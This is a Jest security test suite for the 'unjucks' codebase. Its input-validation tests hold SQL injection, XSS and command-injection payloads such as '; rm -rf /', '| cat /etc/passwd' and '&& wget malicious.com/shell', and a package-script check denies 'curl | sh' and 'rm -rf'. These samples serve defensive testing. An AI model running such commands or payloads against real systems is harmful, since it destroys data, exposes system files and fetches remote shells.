/**
 * Comprehensive Security Test Suite
 * Tests for vulnerabilities in unjucks codebase
 */

import { describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { execSync } from 'child_process';
import { readFileSync, writeFileSync, existsSync } from 'fs';
import { join } from 'path';
import { InputValidator } from '../../src/security/input-validator.js';
import { securityHeadersMiddleware } from '../../src/security/security-headers.js';
import { InjectionPrevention } from '../../src/security/protection/injection-prevention.js';

describe('Security Test Suite', () => {
  
  describe('NPM Vulnerability Scanning', () => {
    it('should have zero high/critical vulnerabilities', () => {
      try {
        const auditResult = execSync('npm audit --json', { encoding: 'utf8' });
        const audit = JSON.parse(auditResult);
        
        expect(audit.metadata.vulnerabilities.high).toBe(0);
        expect(audit.metadata.vulnerabilities.critical).toBe(0);
        
        console.log('✅ NPM Audit Results:');
        console.log(`- Total vulnerabilities: ${audit.metadata.vulnerabilities.total}`);
        console.log(`- High: ${audit.metadata.vulnerabilities.high}`);
        console.log(`- Critical: ${audit.metadata.vulnerabilities.critical}`);
      } catch (error) {
        // npm audit returns non-zero exit code when vulnerabilities found
        const auditResult = error.stdout;
        if (auditResult) {
          const audit = JSON.parse(auditResult);
          expect(audit.metadata.vulnerabilities.high).toBe(0);
          expect(audit.metadata.vulnerabilities.critical).toBe(0);
        } else {
          throw error;
        }
      }
    });
  });

  describe('Secret Detection', () => {
    it('should not contain hardcoded secrets in source code', () => {
      try {
        const secretScan = execSync(
          'grep -r "password\\|secret\\|key\\|token" --include="*.js" --include="*.ts" --exclude-dir=node_modules --exclude-dir=tests --exclude="*test*" src/',
          { encoding: 'utf8' }
        );
        
        // Filter out legitimate patterns (config properties, variable names, etc.)
        const lines = secretScan.split('\n').filter(line => {
          return line && 
                 !line.includes('// ') && // comments
                 !line.includes('* ') && // documentation
                 !line.includes('password:') && // property definitions
                 !line.includes('secretKey:') && // property definitions
                 !line.includes('apiKey:') && // property definitions
                 !line.includes('validatePassword') && // function names
                 !line.includes('generateSecret') && // function names
                 !line.includes('process.env.') && // environment variables
                 !line.includes('config.') && // config references
                 !line.includes('typeof') && // type checks
                 !line.includes('Error(') && // error messages
                 !line.includes('console.') && // logging
                 !line.includes('.password') && // property access
                 !line.includes('.secret') && // property access
                 !line.includes('.key') && // property access
                 !line.includes('.token'); // property access
        });
        
        if (lines.length > 0) {
          console.warn('⚠️  Potential hardcoded secrets found:');
          lines.forEach(line => console.warn(`  ${line}`));
        }
        
        // Allow some legitimate patterns but flag if too many
        expect(lines.length).toBeLessThan(5);
      } catch (error) {
        // No secrets found - this is good
        expect(error.status).toBe(1);
      }
    });
  });

  describe('Code Injection Prevention', () => {
    it('should not use dangerous functions', () => {
      try {
        const dangerousScan = execSync(
          'grep -rn "eval(\\|Function(\\|execSync(\\|exec(" --include="*.js" --include="*.ts" --exclude-dir=node_modules --exclude-dir=tests src/',
          { encoding: 'utf8' }
        );
        
        const lines = dangerousScan.split('\n').filter(line => {
          return line && 
                 !line.includes('// ') && // comments
                 !line.includes('* ') && // documentation  
                 !line.includes('import') && // imports
                 !line.includes('require') && // requires
                 !line.includes('execSync(\'npm') && // legitimate npm commands
                 !line.includes('execSync(`npm') && // legitimate npm commands
                 !line.includes('execSync("npm') && // legitimate npm commands
                 !line.includes('// Safe usage') && // marked safe
                 !line.includes('// Legitimate use'); // marked legitimate
        });
        
        console.log('⚠️  Found dangerous function usage:');
        lines.forEach(line => console.log(`  ${line}`));
        
        // Some usage may be legitimate (like test files, CLI tools)
        // but should be minimized and reviewed
        expect(lines.length).toBeLessThan(20);
      } catch (error) {
        // No dangerous functions found
        expect(error.status).toBe(1);
      }
    });
  });

  describe('Input Validation', () => {
    let validator;
    
    beforeEach(() => {
      validator = new InputValidator();
    });

    it('should detect SQL injection attempts', () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'/**/OR/**/1=1#",
        "' UNION SELECT * FROM passwords--"
      ];
      
      maliciousInputs.forEach(input => {
        expect(() => validator.validateInput(input, 'sql')).toThrow();
      });
    });

    it('should detect XSS attempts', () => {
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "';alert('XSS');//"
      ];
      
      xssPayloads.forEach(payload => {
        expect(() => validator.validateInput(payload, 'xss')).toThrow();
      });
    });

    it('should detect command injection attempts', () => {
      const commandInjections = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& wget malicious.com/shell",
        "`whoami`",
        "$(cat /etc/hosts)"
      ];
      
      commandInjections.forEach(injection => {
        expect(() => validator.validateInput(injection, 'command')).toThrow();
      });
    });
  });

  describe('Security Headers', () => {
    it('should set appropriate security headers', () => {
      const mockReq = {};
      const mockRes = {
        headers: {},
        setHeader: function(name, value) { this.headers[name] = value; }
      };
      const mockNext = jest.fn();
      
      securityHeadersMiddleware(mockReq, mockRes, mockNext);
      
      expect(mockRes.headers['X-Content-Type-Options']).toBe('nosniff');
      expect(mockRes.headers['X-Frame-Options']).toBe('DENY');
      expect(mockRes.headers['X-XSS-Protection']).toBe('1; mode=block');
      expect(mockRes.headers['Strict-Transport-Security']).toBeDefined();
      expect(mockRes.headers['Content-Security-Policy']).toBeDefined();
      expect(mockNext).toHaveBeenCalled();
    });

    it('should have secure CSP configuration', () => {
      const mockReq = {};
      const mockRes = {
        headers: {},
        setHeader: function(name, value) { this.headers[name] = value; }
      };
      const mockNext = jest.fn();
      
      securityHeadersMiddleware(mockReq, mockRes, mockNext);
      
      const csp = mockRes.headers['Content-Security-Policy'];
      expect(csp).toBeDefined();
      expect(csp).not.toContain("'unsafe-eval'");
      expect(csp).not.toContain("*");
      expect(csp).toContain("'self'");
    });
  });

  describe('Template Security', () => {
    it('should escape user input in templates', () => {
      // Test template rendering with malicious input
      const maliciousInput = "<script>alert('XSS')</script>";
      
      // This would need to be implemented based on your template engine
      // For now, we'll test the concept
      const escapeHTML = (str) => {
        return str
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#x27;');
      };
      
      const escaped = escapeHTML(maliciousInput);
      expect(escaped).not.toContain('<script>');
      expect(escaped).toBe('&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;');
    });
  });

  describe('File Upload Security', () => {
    it('should validate file types and sizes', () => {
      const allowedExtensions = ['.md', '.txt', '.json', '.yml', '.yaml'];
      const maxFileSize = 10 * 1024 * 1024; // 10MB
      
      const validateFile = (filename, size) => {
        const ext = filename.toLowerCase().substring(filename.lastIndexOf('.'));
        return allowedExtensions.includes(ext) && size <= maxFileSize;
      };
      
      expect(validateFile('test.md', 1024)).toBe(true);
      expect(validateFile('malicious.exe', 1024)).toBe(false);
      expect(validateFile('huge.md', 20 * 1024 * 1024)).toBe(false);
    });
  });

  describe('Environment Security', () => {
    it('should not expose sensitive environment variables', () => {
      const sensitiveEnvVars = [
        'PASSWORD',
        'SECRET',
        'API_KEY',
        'PRIVATE_KEY',
        'TOKEN'
      ];
      
      // Check if any sensitive env vars are accidentally logged or exposed
      sensitiveEnvVars.forEach(envVar => {
        if (process.env[envVar]) {
          console.warn(`⚠️  Sensitive environment variable ${envVar} is set`);
        }
      });
      
      // This test passes as a reminder to be careful with env vars
      expect(true).toBe(true);
    });
  });

  describe('Dependency Security', () => {
    it('should have secure package.json configuration', () => {
      const packageJson = JSON.parse(readFileSync('package.json', 'utf8'));
      
      // Check for security-related configurations
      expect(packageJson.name).toBeDefined();
      expect(packageJson.version).toBeDefined();
      
      // Ensure no suspicious scripts
      if (packageJson.scripts) {
        Object.entries(packageJson.scripts).forEach(([name, script]) => {
          expect(script).not.toContain('rm -rf');
          expect(script).not.toContain('curl | sh');
          expect(script).not.toContain('wget | sh');
        });
      }
    });
  });
});